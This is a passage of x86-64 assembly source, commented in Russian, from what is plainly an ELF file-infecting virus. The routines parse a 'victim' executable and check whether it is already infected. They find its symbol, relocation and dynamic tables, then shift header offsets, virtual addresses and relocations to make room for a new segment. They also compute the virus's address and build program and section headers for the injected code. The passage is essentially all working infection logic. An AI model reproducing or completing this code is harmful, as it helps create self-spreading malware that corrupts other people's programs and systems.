_get_victim_whole_code_addr_and_size_exit:
    pop     %rdx
    pop     %rcx
    ret

/// _GET_VICTIM_CODE_ADDR_AND_SIZE_WITH_BIND_NOW
/// Если мы вставляем запись BIND_NOW,
/// то высчитываем:
/// - адрес и размер кода жертвы от его начала до
///   места вставки BIND_NOW
/// - адрес и размер кода жертвы от места вставки BIND_NOW
///   и до его конца
_get_victim_code_addr_and_size_with_bind_now:
    push    %rcx
    push    %rdx
    push    %rdi
    push    %rsi

    // вставляем BIND_NOW?
    mov     new_bind_now_flag_record_size(%rip), %rcx
    test    %rcx, %rcx
    je     _get_victim_code_addr_and_size_with_bind_now_fail

    // проверка необходимых данных для высчитывания
    mov     victim_phdr_table_size(%rip), %rcx
    test    %rcx, %rcx
    je      _get_victim_code_addr_and_size_with_bind_now_fail

    mov     victim_phdr_table_addr(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_code_addr_and_size_with_bind_now_fail

    mov      dynamic_records_offset(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_code_addr_and_size_with_bind_now_fail

    mov     new_bind_now_record_frm_dynamic_offset(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_code_addr_and_size_with_bind_now_fail

    // если все данные на месте, начинаем считать
    mov     victim_phdr_table_size(%rip), %rcx
    leaq    victim_code_offset(%rip), %rdx
    mov     %rcx, (%rdx)
    add     $0x40, (%rdx)   # save victim begin code offset
    

    mov     victim_phdr_table_addr(%rip), %rdx
    add     %rdx, %rcx
    
    // сохранили адрес начала кода
    mov     %rcx, victim_code_before_bind_now_addr(%rip)

    mov     dynamic_records_offset(%rip), %rdi
    mov     new_bind_now_record_frm_dynamic_offset(%rip), %rsi
    add     %rdi, %rsi  # offsetnew bind_now record frm file begin
    
    mov     victim_elf_addr(%rip), %rdx
    add     %rsi, %rdx
    mov     %rdx,  victim_code_after_bind_now_addr(%rip)
    

    // высчитали размер кода от начала до вставки

    sub     %rcx, %rdx
    mov     %rdx, victim_code_before_bind_now_size(%rip)
    

    // высчитали размер кода от вставки до конца

        mov     victim_shdr_table_addr(%rip), %rdx
        test    %rdx, %rdx
        je      _count_code_stripped_victim_after_bind_now
    
    _count_code_unstripped_victim_after_bind_now:
        mov     victim_code_after_bind_now_addr(%rip), %rsi
        mov     victim_shdr_table_addr(%rip), %rdx
        sub     %rsi, %rdx
        mov     %rdx, victim_code_after_bind_now_size(%rip)
    
        jmp     _get_victim_code_addr_and_size_with_bind_now_success
    
    _count_code_stripped_victim_after_bind_now:
        mov     file_sz(%rip), %rsi
        mov     victim_elf_addr(%rip), %rdx
        add     %rsi, %rdx
    
        mov     victim_code_after_bind_now_addr(%rip), %rsi
        sub     %rsi, %rdx
        mov     %rdx, victim_code_after_bind_now_size(%rip)
    

_get_victim_code_addr_and_size_with_bind_now_success:
    xor     %rax, %rax
    jmp     _get_victim_code_addr_and_size_with_bind_now_exit

_get_victim_code_addr_and_size_with_bind_now_fail:
    xor     $-1, %rax

_get_victim_code_addr_and_size_with_bind_now_exit:
    pop     %rsi
    pop     %rdi
    pop     %rdx
    pop     %rcx
    ret

_count_offset_frm_vaddr:
    push    %rcx
    push    %rbx
    push    %rdx
    push    %rdi

    mov     victim_phdr_table_addr(%rip), %rdi
    mov     victim_phdr_amount(%rip), %rcx

    test    %rdi, %rdi
    je      _count_offset_frm_vaddr_fail

    test    %rcx, %rcx
    je      _count_offset_frm_vaddr_fail

    mov     cur_vaddr(%rip), %rdx

_count_offset_frm_vaddr_cycle:
        cmp     $0x1, (%rdi)
        jne     _count_offset_frm_vaddr_next
    
      cmp     %rdx, PHDR_P_VADDR(%rdi)
      jg      _count_offset_frm_vaddr_next
      
      mov     PHDR_P_VADDR(%rdi), %rbx
      add     PHDR_P_FILESZ(%rdi), %rbx
      
      cmp     %rdx, %rbx
      jge     _count_offset
    
    _count_offset_frm_vaddr_next:
        add     $0x38, %rdi
    
        loop    _count_offset_frm_vaddr_cycle
        jmp     _count_offset_frm_vaddr_fail

_count_offset:
    mov     PHDR_P_VADDR(%rdi), %rbx
    sub     %rbx, %rdx
    mov     PHDR_P_OFFSET(%rdi), %rbx
    add     %rbx, %rdx
    mov     %rdx, cur_offset(%rip)

_count_offset_frm_vaddr_success:
    xor     %rax, %rax
    jmp     _count_offset_frm_exit

_count_offset_frm_vaddr_fail:
    mov     $-1, %rax

_count_offset_frm_exit:
    pop     %rdi
    pop     %rdx
    pop     %rbx
    pop     %rcx
    ret

/// _FIND_SYMTAB_SECTION
/// Ищет запись GOT в секции dynamic
/// и сохраняет виртуальный адрес секции
/// GOT, если находит запись о ней
_find_symtab_section:
    push    %rbx
    push    %rcx
    push    %rdx
    push    %rdi

    // проверяем данные
    mov     dynamic_records_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _find_symtab_section_fail

    mov     dynamic_records_size(%rip), %rax
    test    %rax, %rax
    je      _find_symtab_section_fail

    xor     %rdx, %rdx
    mov     $0x10, %ecx
    idiv    %ecx

    mov     %eax, %ecx  # количество записей

_find_symtab_section_cycle:
    cmpl    $0x5, (%rdi)
    jne     _check_syment
    
    mov     0x8(%rdi), %rax
    mov     %rax, strtab_section_vaddr(%rip)
    jmp     _find_symtab_section_next

_check_syment:

    cmpl    $0xb, (%rdi)
    jne     _check_symtab
    
    mov     0x8(%rdi), %rax
    mov     %rax, symtab_record_size(%rip)
    jmp     _find_symtab_section_next

_check_symtab:

    cmpl     $0x6, (%rdi)
    jne      _find_symtab_section_next
    mov      0x8(%rdi), %rax
    mov      %rax, symtab_section_vaddr(%rip)

_find_symtab_section_next:
    add     $0x10, %rdi
    loop    _find_symtab_section_cycle

_find_symtab_section_success:

    mov     symtab_section_vaddr(%rip), %rax
    test    %rax, %rax
    je      _find_symtab_section_fail
    
    mov     %rax, cur_vaddr(%rip)
    call    _count_offset_frm_vaddr
    test    %rax, %rax
    jne      _find_symtab_section_fail
    
    // считаем адрес symtab в памяти
    mov     victim_elf_addr(%rip), %rbx
    mov     cur_offset(%rip), %rax
    add     %rax, %rbx
    mov     %rbx, symtab_section_addr(%rip)
    

    mov     strtab_section_vaddr(%rip), %rax
    test    %rax, %rax
    je      _find_symtab_section_fail
    
    sub     cur_vaddr(%rip), %rax
    
    mov     symtab_record_size(%rip), %rcx
    test    %rcx, %rcx
    je      _find_symtab_section_fail
    
    xor     %rdx, %rdx
    idiv    %ecx
    mov     %eax, symtab_records_amount(%rip)

    xor     %rax, %rax
    jmp     _find_symtab_section_exit

_find_symtab_section_fail:
    mov     $-1, %rax

_find_symtab_section_exit:
    pop     %rbx
    pop     %rdi
    pop     %rdx
    pop     %rcx
    ret

_find_rela_table:
    push    %rbx
    push    %rcx
    push    %rdx
    push    %rdi

    // проверяем данные
    mov     dynamic_records_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _find_rela_table_exit

    mov     dynamic_records_size(%rip), %rax
    test    %rax, %rax
    je      _find_rela_table_exit

    xor     %rdx, %rdx
    mov     $0x10, %ecx
    idiv    %ecx

    mov     %eax, %ecx  # количество записей

    _find_rela_table_cycle:
        cmpl    $0x7, (%rdi)
        jne     _check_relasz
        
        mov      0x8(%rdi), %rax
        mov      %rax, rela_table_vaddr(%rip)
        jmp     _find_rela_table_next
    
    _check_relasz:
        cmpl    $0x8, (%rdi)
        jne     _check_relaent
        
        mov      0x8(%rdi), %rax
        mov      %rax, rela_table_size(%rip)
        jmp     _find_rela_table_next
    
    _check_relaent:
        cmpl    $0x9, (%rdi)
        jne     _find_rela_table_next
        
        mov      0x8(%rdi), %rax
        mov      %rax, rela_record_size(%rip)
        jmp     _find_rela_table_next
    
    _find_rela_table_next:
        add     $0x10, %rdi
        loop    _find_rela_table_cycle

// _find_rela_table_cycle:
//     cmpl    $0x7, (%rdi)
//     jne     _check_relasz
//     
//     mov      0x8(%rdi), %rax
//     mov      %rax, rela_table_vaddr(%rip)
//     jmp     _find_rela_table_next

// _check_relasz:
//     cmpl    $0x8, (%rdi)
//     jne     _check_relaent
//     
//     mov      0x8(%rdi), %rax
//     mov      %rax, rela_table_size(%rip)
//     jmp     _find_rela_table_next

// _check_relaent:
//     cmpl    $0x9, (%rdi)
//     jne     _find_rela_table_next
//     
//     mov      0x8(%rdi), %rax
//     mov      %rax, rela_record_size(%rip)
//     jmp     _find_rela_table_next

// _find_rela_table_next:
//     add     $0x10, %rdi
//     loop    _find_rela_table_cycle

_find_rela_table_success:
    mov     rela_table_vaddr(%rip), %rax
    test    %rax, %rax
    je      _find_rela_table_fail
    
    mov     %rax, cur_vaddr(%rip)
    call    _count_offset_frm_vaddr
    test    %rax, %rax
    jne      _find_rela_table_fail
    
    // считаем адрес rela в памяти
    mov     victim_elf_addr(%rip), %rbx
    mov     cur_offset(%rip), %rax
    add     %rax, %rbx
    mov     %rbx, rela_table_addr(%rip)

    mov     rela_table_size(%rip), %rax
    test    %rax, %rax
    je      _find_rela_table_fail
    
    mov     rela_record_size(%rip), %rcx
    test    %rcx, %rcx
    je      _find_rela_table_fail
    
    xor     %rdx, %rdx
    idiv    %ecx
    mov     %eax, rela_records_amount(%rip)

    xor     %rax, %rax
    jmp     _find_rela_table_exit

_find_rela_table_fail:
    mov     $-1, %rax

_find_rela_table_exit:
    pop     %rbx
    pop     %rdi
    pop     %rdx
    pop     %rcx
    ret
_find_jmprela_table:

    push    %rbx
    push    %rcx
    push    %rdx
    push    %rdi

    // проверяем данные
    mov     dynamic_records_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _find_jmprela_table_fail

    mov     dynamic_records_size(%rip), %rax
    test    %rax, %rax
    je      _find_jmprela_table_fail

    xor     %rdx, %rdx
    mov     $0x10, %ecx
    idiv    %ecx

    mov     %eax, %ecx  # количество записей

_find_jmprela_table_cycle:
    cmpl    $0x17, (%rdi)
    jne     _check_jmprelasz
    
    mov      0x8(%rdi), %rax
    mov      %rax, jmprela_table_vaddr(%rip)
    jmp     _find_jmprela_table_next
    

_check_jmprelasz:
    cmpl    $0x2, (%rdi)
    jne     _check_jmprelaent
    
    mov      0x8(%rdi), %rax
    mov      %rax, jmprela_table_size(%rip)
    jmp     _find_jmprela_table_next

_check_jmprelaent:
    cmpl    $0x9, (%rdi)
    jne     _find_jmprela_table_next
    
    mov      0x8(%rdi), %rax
    mov      %rax, jmprela_record_size(%rip)
    jmp     _find_jmprela_table_next

_find_jmprela_table_next:
    add     $0x10, %rdi
    loop    _find_jmprela_table_cycle

_find_jmprela_table_success:
    mov     jmprela_table_vaddr(%rip), %rax
    test    %rax, %rax
    je      _find_jmprela_table_fail

    mov     %rax, cur_vaddr(%rip)
    call    _count_offset_frm_vaddr
    test    %rax, %rax
    jne     _find_jmprela_table_fail

    // считаем адрес jmprela в памяти
    mov     victim_elf_addr(%rip), %rbx
    mov     cur_offset(%rip), %rax
    add     %rax, %rbx
    mov     %rbx, jmprela_table_addr(%rip)

    mov     jmprela_table_size(%rip), %rax
    test    %rax, %rax
    je      _find_jmprela_table_fail

    mov     jmprela_record_size(%rip), %rcx
    test    %rcx, %rcx
    je      _find_jmprela_table_fail

    xor     %rdx, %rdx
    idiv    %ecx
    mov     %eax, jmprela_records_amount(%rip)

    xor     %rax, %rax
    jmp     _find_jmprela_table_exit

_find_jmprela_table_fail:
    mov     $-1, %rax

_find_jmprela_table_exit:
    pop     %rbx
    pop     %rdi
    pop     %rdx
    pop     %rcx
    ret
/// _COUNT_VICTIM_CODE_BEGIN_VADDR
/// считает виртуальный адрес кода жертвы
_count_victim_code_begin_vaddr:
    push    %rdx
    push    %rdi
    push    %rsi

    mov    victim_code_offset(%rip), %rdx
    test    %rdx, %rdx
    je     _count_victim_code_begin_vaddr_fail

    mov    first_seg_vaddr(%rip), %rdi
    add    %rdx, %rdi

    leaq   victim_code_frm_begin_vaddr(%rip), %rsi
    mov    %rdi, (%rsi)
    xor    %rax, %rax
    jmp     _count_victim_code_begin_vaddr_exit

_count_victim_code_begin_vaddr_fail:
    mov     $-1, %rax

_count_victim_code_begin_vaddr_exit:
    pop    %rsi
    pop    %rdi
    pop    %rdx
    ret
/// _PARSE_VICTIM
/// Вызывает парсинг жертвы
/// В случае провала возвращ -1
_parse_victim:
    call    _get_victim_addr
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _is_it_elf
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _get_phdrs_info
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _check_file_infection
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _get_shdrs_info

    cmp      $0x1, stripped_mode(%rip)
    je       _continue_parsing

    test    %rax, %rax
    jne     _parse_victim_fail

_continue_parsing:
    call    _find_first_seg_vaddr
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _find_last_seg_vaddr
    test    %rax, %rax
    jne     _parse_victim_fail

    call     _find_dynamic_segment
    test    %rax, %rax
    jne      _get_victim_code
    

_check_bind_now:

    call    _find_bind_now_record
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _find_rela_table
    call    _find_jmprela_table
    

_get_victim_code:
    call    _get_victim_whole_code_addr_and_size
    test    %rax, %rax
    je      _find_first_text_section

    call    _get_victim_code_addr_and_size_with_bind_now
    test    %rax, %rax
    jne     _parse_victim_fail

_find_first_text_section:
    call    _find_symtab_section
    // test    %rax, %rax
    // jne     _parse_victim_fail
    

    call    _count_victim_code_begin_vaddr
    test    %rax, %rax
    jne     _parse_victim_fail

_parse_victim_success:
    movq    $0, parse_success(%rip)
    xor     %rax, %rax
    jmp     _parse_victim_exit

_parse_victim_fail:
    mov   $-1, %rax

_parse_victim_exit:
    ret

/// _RECOUNT_SYMBOLS_ADDRS
/// Редактирует vaddr символов
_recount_symbols_addrs:
    push     %rcx
    push     %rbx
    push     %rdx
    push     %r8
    push     %rdi
    push     %rsi

    // проверяем необходимые данные
    mov     symtab_section_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _recount_symbols_addrs_fail

    mov     symtab_records_amount(%rip), %rcx
    test    %rcx, %rcx
    je      _recount_symbols_addrs_fail

    mov     symtab_record_size(%rip), %rsi
    test    %rsi, %rsi
    je      _recount_symbols_addrs_fail

    mov     dynamic_records_vaddr(%rip), %r8

    // константа, на которую увеличиваются
    // виртуальные адреса
    mov     $0x38, %rdx
    
    mov     new_bind_now_flag_record_size(%rip), %rbx
    

_recount_symbols_addrs_cycle:
    cmp     $0, 0x8(%rdi)  # vaddr символа
    je      _recount_symbols_next_iter

    cmp     %r8, 0x8(%rdi)
    jle     _add_const_symtab
    
    add     %rbx, 0x8(%rdi)  # сместили на разм. +1 dyn. record
_add_const_symtab:
    add     %rdx, (%rdi)  # сместили на разм. virus phdr

_recount_symbols_next_iter:
    add     %rsi, %rdi
    loop    _recount_symbols_addrs_cycle

    xor     %rax, %rax
    jmp     _recount_symbols_addrs_exit

_recount_symbols_addrs_fail:
    mov    $-1, %rax

_recount_symbols_addrs_exit:
    pop     %rsi
    pop     %rdi
    pop     %r8
    pop     %rdx
    pop     %rbx
    pop     %rcx
    ret



_recount_rela_table:
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %rdi
    push    %rsi

    mov     rela_table_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _recount_rela_table_fail

    mov     rela_records_amount(%rip), %rcx
    test    %rcx, %rcx
    je      _recount_rela_table_fail

    mov     rela_record_size(%rip), %rsi
    test    %rsi, %rsi
    je      _recount_rela_table_fail

    mov     dynamic_records_vaddr(%rip), %r8

    mov     $0x38, %rdx

    _recount_rela_table_cycle:
        cmp     $0x0, (%rdi)
        je      _recount_rela_table_next
    
    _recount_cur_relocate:
        cmp     $0x6, 8(%rdi)
        je      _recount_relocate_value
        
        cmp     $0x7, 8(%rdi)
        jne     _edit_relocate
        
    
    _recount_relocate_value:
        mov     (%rdi), %rax
        mov     %rax, cur_vaddr(%rip)
        call    _count_offset_frm_vaddr
        test     %rax, %rax
        jne      _recount_rela_table_fail
        
        // считаем адрес записи got в памяти
        mov     victim_elf_addr(%rip), %rbx
        mov     cur_offset(%rip), %rax
        add     %rax, %rbx
        
        cmp     $0,  (%rbx)
        je      _edit_relocate
        add     %rdx, (%rbx)
    
    _edit_relocate:
        mov     new_bind_now_flag_record_size(%rip), %rbx
        
        cmp     %r8, (%rdi)
        jle     _add_const_to_relocate
        
        // vaddr релокейта + размер новой записи
        // dynamic
        add     %rbx, (%rdi)
        
    
    _add_const_to_relocate:
        add     %rdx, (%rdi)
    
    _recount_rela_table_next:
        add     %rsi, %rdi
        loop    _recount_rela_table_cycle

_recount_rela_table_succes:
    xor     %rax, %rax
    jmp     _recount_rela_table_exit

_recount_rela_table_fail:
    mov     $-1, %rax

_recount_rela_table_exit:
    pop     %rsi
    pop     %rdi
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx
    ret

_recount_jmprela_table:
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %rdi
    push    %rsi

    mov     jmprela_table_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _recount_jmprela_table_fail

    mov     jmprela_records_amount(%rip), %rcx
    test    %rcx, %rcx
    je      _recount_jmprela_table_fail

    mov     jmprela_record_size(%rip), %rsi
    test    %rsi, %rsi
    je      _recount_jmprela_table_fail

    mov     dynamic_records_vaddr(%rip), %r8

    mov     $0x38, %rdx

_recount_jmprela_table_cycle:
    cmp     $0x0, (%rdi)
    je      _recount_jmprela_table_next

_recount_cur_jmp_relocate:
    cmp     $0x6, 8(%rdi)
    je      _recount_jmp_relocate_value

    cmp     $0x7, 8(%rdi)
    jne     _edit_jmp_relocate

_recount_jmp_relocate_value:
    mov     (%rdi), %rax
    mov     %rax, cur_vaddr(%rip)
    call    _count_offset_frm_vaddr
    test     %rax, %rax
    jne      _recount_jmprela_table_fail

    // считаем адрес записи got в памяти
    mov     victim_elf_addr(%rip), %rbx
    mov     cur_offset(%rip), %rax
    add     %rax, %rbx

    cmp     $0,  (%rbx)
    je      _edit_jmp_relocate
    add     %rdx, (%rbx)

_edit_jmp_relocate:
    mov     new_bind_now_flag_record_size(%rip), %rbx
    
    cmp     %r8, (%rdi)
    jle     _add_const_to_jmp_relocate
    
    // vaddr релокейта + размер новой записи
    // dynamic
    add     %rbx, (%rdi)
    

_add_const_to_jmp_relocate:
    add     %rdx, (%rdi)

_recount_jmprela_table_next:
    add     %rsi, %rdi
    loop    _recount_jmprela_table_cycle

_recount_jmprela_table_succes:
    xor     %rax, %rax
    jmp     _recount_jmprela_table_exit

_recount_jmprela_table_fail:
    mov     $-1, %rax

_recount_jmprela_table_exit:
    pop     %rsi
    pop     %rdi
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx
    ret

/// _SHDR_OFFSET_AND_ADDR_RECOUNT
/// Пересчитывает адреса и смещения в заголовках, если они не 0
/// Поскольку секция dynamic может расширяться (в заивимости от того,
/// выставлен в ней флаг BIND_NOW компилером или нет),
/// то код, который находится
/// ниже секции dynamic должен сместиться, учитывая это расширение
    .globl  _shdr_offset_and_addr_recount
    .type	_shdr_offset_and_addr_recount, @function

_shdr_offset_and_addr_recount:
    push  %rbx
    push  %rdx
    push  %rcx
    push  %r8
    push  %rdi
    push  %rsi

    // проверяем необходимые данные
    mov     victim_shdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je     _shdr_offset_and_addr_recount_fail

    mov     victim_shdr_table_addr(%rip), %rdi
    test    %rdi, %rdi
    je     _shdr_offset_and_addr_recount_fail

    
    mov     new_bind_now_flag_record_size(%rip), %rbx
    

    mov     $0x38, %rdx

_shdr_offset_and_addr_recount_cycle:
    cmp     $0, SHDR_SH_ADDR(%rdi)      # sh_addr <= 0?
    jle     _recount_shdr_offset

    
    // секция расположенаа до dynamic?
    mov     dynamic_records_vaddr(%rip), %rax
    
    cmp      %rax, SHDR_SH_ADDR(%rdi)
    jle     _add_const_to_addr
    
    // да, скорректировать в соответствии
    // с возможным расширением dynamic
    add     %rbx,  SHDR_SH_ADDR(%rdi)
    

_add_const_to_addr:
    add     %rdx,  SHDR_SH_ADDR(%rdi)

_recount_shdr_offset:
    cmp     $0, SHDR_SH_OFFSET(%rdi)
    jle     _next_iter_recount

    
    // секция расположена до dynamic?
    mov     dynamic_records_offset(%rip), %rax
    cmp     %rax, SHDR_SH_OFFSET(%rdi)
    
    jle     _add_const_to_offset
    
    // да, скорректировать в соответствии
    // с возможным расширением dynamic
    add     %rbx, SHDR_SH_OFFSET(%rdi)
    

_add_const_to_offset:
    add     %rdx, SHDR_SH_OFFSET(%rdi)

_next_iter_recount:
    add     $0x40, %rdi    # смещение до след. заголовка
    loop    _shdr_offset_and_addr_recount_cycle

_shdr_offset_and_addr_recount_success:
    xor     %rax, %rax
    jmp     _shdr_offset_and_addr_recount_exit

_shdr_offset_and_addr_recount_fail:
    mov      $-1, %rax

_shdr_offset_and_addr_recount_exit:
    pop      %rsi
    pop      %rdi
    pop      %r8
    pop      %rcx
    pop      %rdx
    pop      %rbx
    ret

/// _PHDR_OFFSET_AND_ADDR_RECOUNT
/// Поскольку секция dynamic может расширяться (в заивимости от того,
/// выставлен в ней флаг BIND_NOW компилером или нет),
/// то код, который находится
/// ниже секции dynamic должен сместиться, учитывая это расширение
_phdr_offset_and_addr_recount:
    push    %rbx
    push    %rdx
    push    %rcx
    push    %r8
    push    %rdi
    push    %rsi

    // проверяем данные,
    // необходимые для редактирования
    mov     victim_phdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je     _phdr_offset_and_addr_recount_fail

    mov     victim_phdr_table_addr(%rip), %rdi
    test    %rdi, %rdi
    je     _phdr_offset_and_addr_recount_fail

    mov     first_seg_vaddr(%rip), %rsi

    
    mov     new_bind_now_flag_record_size(%rip), %rbx
    
    mov     $0x38, %rdx

_phdr_offset_and_addr_recount_cycle:
    movl    (%rdi), %eax

    // это заголовок самой таблицы заголовков?
    cmp     $0x6,  %rax
    je      _edit_phdr_table_header

 // это заголовок сегмента dynamic?
 cmp     $0x2,  %rax
 jne     _phdr_offset_and_addr_check
 
 _edit_dynamic_header:
 
 add     %rbx, PHDR_P_FILESZ(%rdi)
 add     %rbx, PHDR_P_MEMSZ(%rdi)
 
 jmp     _phdr_offset_and_addr_check
 

_edit_phdr_table_header:
    // редактируем поля p_filesz
    // и p_memsz в заголовке таблицы сегментов
    // заголовков станет на один больше, значит,
    //  размер таблицы надо увеличить на 56 байт
    add     %rdx, PHDR_P_FILESZ(%rdi)
    add     %rbx, PHDR_P_MEMSZ(%rdi)

    jmp     _next_iter_recount_phdr

_phdr_offset_and_addr_check:
    cmp     %rsi, PHDR_P_PADDR(%rdi)
    je      _edit_first_segm_header

    cmp     $0,  PHDR_P_PADDR(%rdi)
    jle     _recount_offset
    jmp     _recount_vaddr_paddr

_edit_first_segm_header:
    // это первый сегмент кода -
    // содерит в себе заголовки
    // увеличить его p_memsz и p_filesz
    // на размер добавляемого заголвока
    // а вот его vaddr,paddr и offset
    // не редактируем - новый заголвок
    // будет вписан В него, а не ДО
    // него
    add     %rdx, PHDR_P_FILESZ(%rdi)
    add     %rdx, PHDR_P_MEMSZ(%rdi)

    jmp     _next_iter_recount_phdr

    _recount_vaddr_paddr:
        mov     dynamic_records_vaddr(%rip), %r8
    
        cmp     %r8, PHDR_P_VADDR(%rdi)
        jle     _add_const_to_vaddr_paddr
    
        add     %rbx, PHDR_P_VADDR(%rdi)
        add     %rbx, PHDR_P_PADDR(%rdi)
    

_add_const_to_vaddr_paddr:
    add     %rdx, PHDR_P_VADDR(%rdi)
    add     %rdx, PHDR_P_PADDR(%rdi)

_recount_offset:
    cmp     $0, PHDR_P_OFFSET(%rdi)
    jle     _next_iter_recount_phdr

    mov     dynamic_records_offset(%rip), %r8
    
    cmp     %r8, PHDR_P_OFFSET(%rdi)
    jle     _add_const_to_phdr_offset
    
    add     %rbx, PHDR_P_OFFSET(%rdi)
    
_add_const_to_phdr_offset:
    add     %rdx, PHDR_P_OFFSET(%rdi)

    jmp     _next_iter_recount_phdr

_next_iter_recount_phdr:
    add     $0x38, %rdi

    dec     %rcx
    test    %rcx, %rcx
    jne     _phdr_offset_and_addr_recount_cycle

_phdr_offset_and_addr_recount_success:
    xor     %rax, %rax
    jmp     _phdr_offset_and_addr_recount_exit

_phdr_offset_and_addr_recount_fail:
    mov     $-1, %rax

_phdr_offset_and_addr_recount_exit:
    pop     %rsi
    pop     %rdi
    pop     %r8
    pop     %rcx
    pop     %rdx
    pop     %rbx
    ret

/// _RECOUNT_DYNAMIC_SECTION
/// редактирует vaddr кода, описываемого записями в dynamic,
/// а так же находит запись GOT и сохраняет ее измененный vaddr
_recount_dynamic_section:
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %r9
    push    %rdi
    push    %rsi

    mov     dynamic_records_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _recount_dynamic_section_fail

    mov     dynamic_records_size(%rip), %rdx
    test    %rdx, %rdx
    je      _recount_dynamic_section_fail

    mov     dynamic_records_vaddr(%rip), %r9
    test    %r9, %r9
    je      _recount_dynamic_section_fail

    mov     victim_code_frm_begin_vaddr(%rip), %r8
    test    %r8, %r8
    je      _recount_dynamic_section_fail

    // считаем количество записей
    mov     %edx, %eax
    xor     %rdx, %rdx
    mov     $0x10, %ecx
    idiv    %ecx
    mov     %eax, %ecx
    

    mov     %r8, %rdx
    mov     %rdi, %rax

    mov     new_bind_now_flag_record_size(%rip), %rbx
    mov     constant_value(%rip), %rsi

    _recount_dynamic_section_cycle:
        cmp     %rdx,  0x8(%rax)
        jle     _recount_dynamic_section_next_iter
    
        // код лежит после секции dynamic?
        cmp     %r9,  0x8(%rax)
        jle     _add_const
        
        add     %rbx, 0x8(%rax)
        
    
    _add_const:
        // vaddr релокейта + константа
        add     %rsi, 0x8(%rax)
    
    _recount_dynamic_section_next_iter:
        add     $0x10, %rax    # сдвиг на след. запись
        loop    _recount_dynamic_section_cycle

_recount_dynamic_section_success:
    xor     %rax, %rax
    jmp     _recount_dynamic_section_exit

_recount_dynamic_section_fail:
    mov     $-1, %rax

_recount_dynamic_section_exit:
    pop     %rsi
    pop     %rdi
    pop     %r9
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx
    ret


/// _COUNT_VIRUS_NEW_VADDR
/// Считает виртуальный адрес вируса внутри
/// инфицированной жертвы
/// Адрес считается как
/// vaddr последнего загружаемого сегмента кода жертвы +
/// ее выравнивание + смещение до кода вируса в файле
_count_virus_new_vaddr:
    push    %rbx
    push    %rcx

    mov     last_seg_vaddr(%rip), %rax
    test    %rax, %rax
    je      _count_virus_new_vaddr_fail
    
    mov     last_seg_memsz(%rip), %rbx
    add     %rax, %rbx

    mov    	last_seg_allign(%rip), %rcx
    add     %rcx, %rbx
    and     $~0xFFF, %rbx

    mov     stripped_mode(%rip), %rax
    test    %rax, %rax
    jne     _count_virus_new_vaddr_stripped

    mov     victim_elf_addr(%rip), %rax
    mov     ELF_E_SHOFF(%rax), %rcx
    
    add     $0x38, %rbx
    jmp     _count_virus_new_vaddr_add_all

_count_virus_new_vaddr_stripped:
    mov     file_sz(%rip), %rcx
    add     $0x38, %rcx

_count_virus_new_vaddr_add_all:
    mov     new_bind_now_flag_record_size(%rip), %rax
    add     %rax, %rbx
    

_count_virus_new_vaddr_success:
    add     %rcx, %rbx
    mov     %rbx, virus_new_vaddr(%rip)
    

    xor     %rax, %rax
    jmp     _count_virus_new_vaddr_exit

_count_virus_new_vaddr_fail:
    mov      $-1, %rax

_count_virus_new_vaddr_exit:
    pop     %rcx
    pop     %rbx
    ret

/// _GENERATE_VIRUS_PHDR
/// генерирует заголовок сегмента для кода вируса
_generate_virus_phdr:
    push    %rbx
    push    %rcx

    mov      virus_new_vaddr(%rip),%rbx
    test     %rbx, %rbx
    je      _generate_virus_phdr_fail

    leaq    virus_new_phdr(%rip), %rax

    movb    $0x1, (%rax) # p_type
    add     $0x4, %rax

    movb    $0x5, (%rax) # p_flags
    add     $0x4, %rax

    mov     victim_elf_addr(%rip), %rbx
    mov     ELF_E_SHOFF(%rbx), %rbx
    test    %rbx, %rbx
    je      _generate_virus_phdr_stripped
    jmp     _count_virus_offset

_generate_virus_phdr_stripped:
    mov     file_sz(%rip), %rbx

_count_virus_offset:
    add     $0x38, %rbx
    mov     new_bind_now_flag_record_size(%rip), %rcx
    add     %rcx, %rbx
    movq    %rbx, (%rax) # p_offset
    add     $0x8, %rax

    mov     virus_new_vaddr(%rip),%rbx
    movq    %rbx, (%rax) # vaddr
    add     $0x8, %rax

    movq    %rbx, (%rax) # paddr
    add     $0x8, %rax

    mov     virus_code_size(%rip), %rbx
    movq    %rbx, (%rax) # p_filesz

    // к размеру кода добавили блок данных жертвы
    mov     data_size(%rip), %rcx
    add     %rcx, (%rax)

    add     $0x8, %rax

    movq    %rbx, (%rax) # p_memsz
    add     %rcx, (%rax)

    add     $0x8, %rax

    # поле p_allign при инициализации
    # заполнено нулями, что и нужно
_generate_virus_phdr_success:
    xor     %rax, %rax
    jmp     _generate_virus_phdr_exit
_generate_virus_phdr_fail:
    mov     $-1, %rax

_generate_virus_phdr_exit:
    pop     %rcx
    pop     %rbx
    ret


/// _GENERATE_VIRUS_SHDR
/// генерирует заголовок секции для кода вируса
_generate_virus_shdr:
    push    %rbx

    mov      victim_shdr_table_addr(%rip),%rbx
    test     %rbx, %rbx
    je      _generate_virus_shdr_fail

    mov      virus_new_vaddr(%rip),%rbx
    test     %rbx, %rbx
    je      _generate_virus_shdr_fail

    leaq    virus_new_shdr(%rip), %rax
    leaq    sh_name_indx(%rip), %rbx

    movl    (%rbx), %ebx  # sh_name
    movl    $0x0,  (%rax)
    add     $0x4, %rax

    movb    $0x1, (%rax)  # sh_type
    add     $0x4, %rax

    movb    $0x6, (%rax)  # sh_flags
